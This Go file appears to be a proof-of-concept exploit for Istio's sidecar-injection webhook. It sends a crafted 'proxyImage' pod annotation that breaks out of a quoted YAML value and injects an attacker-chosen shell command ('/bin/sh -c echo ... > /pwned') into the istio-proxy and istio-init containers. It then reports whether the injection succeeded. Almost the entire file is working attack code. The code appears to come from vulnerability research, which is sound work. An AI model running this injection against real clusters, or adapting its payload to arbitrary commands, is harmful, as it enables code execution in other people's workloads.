// Standalone reproducer: sidecar.istio.io/proxyImage YAML/structure injection
// into the REAL istiod sidecar-injection mutating webhook handler.
//
// Run:  go run /home/user/istio/.zeroday/scratch/webhook/repro_proxyimage.go
//
// It builds a real inject.Webhook (NewWebhook) using the REAL default injection
// template + values captured from chart rendering (real-inject-config.yaml,
// real-values.yaml), starts the REAL /inject HTTP handler via httptest, and
// POSTs a real AdmissionReview whose Pod carries a crafted proxyImage annotation.
// It then applies the returned JSON patch and inspects the injected istio-proxy
// / istio-init containers for attacker-injected fields (command).
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"

	jsonpatch "github.com/evanphx/json-patch/v5"
	v1beta1 "k8s.io/api/admission/v1beta1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"

	"istio.io/istio/pilot/pkg/model"
	"istio.io/istio/pkg/config/mesh"
	"istio.io/istio/pkg/config/mesh/meshwatcher"
	"istio.io/istio/pkg/kube/inject"
	"istio.io/istio/pkg/kube/multicluster"
)

const scratch = "/home/user/istio/.zeroday/scratch/webhook"

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func buildWebhook() (*httptest.Server, func()) {
	// Load the REAL captured injector config + values into temp files for the file watcher.
	cfg, err := os.ReadFile(filepath.Join(scratch, "real-inject-config.yaml"))
	must(err)
	vals, err := os.ReadFile(filepath.Join(scratch, "real-values.yaml"))
	must(err)

	dir, err := os.MkdirTemp("", "reprowh")
	must(err)
	cfgFile := filepath.Join(dir, "config")
	valFile := filepath.Join(dir, "values")
	must(os.WriteFile(cfgFile, cfg, 0o644))
	must(os.WriteFile(valFile, vals, 0o644))

	watcher, err := inject.NewFileWatcher(cfgFile, valFile)
	must(err)

	mc := mesh.DefaultMeshConfig()
	env := &model.Environment{
		Watcher: meshwatcher.NewTestWatcher(mc),
	}
	env.SetPushContext(&model.PushContext{})

	mux := http.NewServeMux()
	_, err = inject.NewWebhook(inject.WebhookParameters{
		Watcher:      watcher,
		Port:         0,
		Env:          env,
		Mux:          mux,
		MultiCluster: multicluster.NewFakeController(),
	})
	must(err)

	srv := httptest.NewServer(mux)
	return srv, func() { srv.Close(); os.RemoveAll(dir) }
}

func admissionReviewForPod(pod corev1.Pod) []byte {
	raw, err := json.Marshal(&pod)
	must(err)
	review := v1beta1.AdmissionReview{
		TypeMeta: metav1.TypeMeta{Kind: "AdmissionReview", APIVersion: "admission.k8s.io/v1beta1"},
		Request: &v1beta1.AdmissionRequest{
			Kind:      metav1.GroupVersionKind{Group: "", Version: "v1", Kind: "Pod"},
			Object:    runtime.RawExtension{Raw: raw},
			Operation: v1beta1.Create,
			Namespace: "default",
		},
	}
	b, err := json.Marshal(review)
	must(err)
	return b
}

func inject_(srv *httptest.Server, body []byte) v1beta1.AdmissionReview {
	req, err := http.NewRequest(http.MethodPost, srv.URL+"/inject", bytes.NewReader(body))
	must(err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	must(err)
	defer resp.Body.Close()
	rb, err := io.ReadAll(resp.Body)
	must(err)
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(rb)))
	}
	var out v1beta1.AdmissionReview
	must(json.Unmarshal(rb, &out))
	return out
}

func applyPatch(pod corev1.Pod, patch []byte) corev1.Pod {
	orig, err := json.Marshal(&pod)
	must(err)
	p, err := jsonpatch.DecodePatch(patch)
	must(err)
	patched, err := p.Apply(orig)
	must(err)
	var out corev1.Pod
	must(json.Unmarshal(patched, &out))
	return out
}

func findContainer(cs []corev1.Container, name string) *corev1.Container {
	for i := range cs {
		if cs[i].Name == name {
			return &cs[i]
		}
	}
	return nil
}

func main() {
	srv, cleanup := buildWebhook()
	defer cleanup()

	// ---- Attack: craft a pod annotation that breaks out of the image: "..." YAML scalar.
	// The template renders:   image: "<VALUE>"   (4-space indent, double-quoted).
	// We close the quote, inject sibling container-level keys (command + a closing
	// key that re-opens a quote to swallow the template's trailing '"'), all at 4 spaces.
	// The image itself is kept as the *legitimate* proxy image (contains '/'), so this
	// is NOT merely the sanctioned image-override feature -- we add fields no annotation
	// is supposed to allow (command) onto the injected istio-proxy AND istio-init containers.
	payload := "" +
		"registry.istio.io/testing/proxyv2:latest\"\n" +
		"    command:\n" +
		"    - /bin/sh\n" +
		"    - -c\n" +
		"    - echo OWNED_BY_ANNOTATION_INJECTION > /pwned; sleep 1\n" +
		"    terminationMessagePath: \"/dev/injected"

	pod := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "victim",
			Namespace: "default",
			Labels:    map[string]string{"sidecar.istio.io/inject": "true"},
			Annotations: map[string]string{
				"sidecar.istio.io/proxyImage": payload,
			},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{{Name: "app", Image: "nginx"}},
		},
	}

	body := admissionReviewForPod(pod)
	out := inject_(srv, body)

	if out.Response == nil {
		panic("nil response")
	}
	fmt.Printf("Allowed=%v\n", out.Response.Allowed)
	if out.Response.Result != nil && out.Response.Result.Message != "" {
		fmt.Printf("Result.Message=%q\n", out.Response.Result.Message)
	}
	if len(out.Response.Patch) == 0 {
		fmt.Println("NO PATCH RETURNED -> injection did not occur (candidate refuted for this payload)")
		return
	}

	patched := applyPatch(pod, out.Response.Patch)

	secCtx := func(c corev1.Container) string {
		if c.SecurityContext == nil {
			return "nil"
		}
		ru := "nil"
		if c.SecurityContext.RunAsUser != nil {
			ru = fmt.Sprintf("%d", *c.SecurityContext.RunAsUser)
		}
		caps := ""
		if c.SecurityContext.Capabilities != nil {
			caps = fmt.Sprintf(" addCaps=%v", c.SecurityContext.Capabilities.Add)
		}
		return fmt.Sprintf("runAsUser=%s%s", ru, caps)
	}
	fmt.Println("---- Injected pod containers ----")
	for _, c := range patched.Spec.Containers {
		fmt.Printf("container %q image=%q command=%v secctx=[%s]\n", c.Name, c.Image, c.Command, secCtx(c))
	}
	for _, c := range patched.Spec.InitContainers {
		fmt.Printf("initContainer %q image=%q command=%v secctx=[%s]\n", c.Name, c.Image, c.Command, secCtx(c))
	}

	proxy := findContainer(patched.Spec.Containers, "istio-proxy")
	if proxy == nil {
		proxy = findContainer(patched.Spec.InitContainers, "istio-proxy")
	}
	initc := findContainer(patched.Spec.InitContainers, "istio-init")
	if initc == nil {
		initc = findContainer(patched.Spec.InitContainers, "istio-validation")
	}

	fmt.Println("---- VERDICT ----")
	hit := false
	if proxy != nil && len(proxy.Command) > 0 {
		fmt.Printf("CONFIRMED: attacker-controlled command injected into %q: %v\n", proxy.Name, proxy.Command)
		hit = true
	}
	if initc != nil && len(initc.Command) > 0 {
		fmt.Printf("CONFIRMED: attacker-controlled command injected into %q (image=%q): %v\n", initc.Name, initc.Image, initc.Command)
		hit = true
	}
	if !hit {
		fmt.Println("Not confirmed with this payload; inspect containers above.")
	}
}
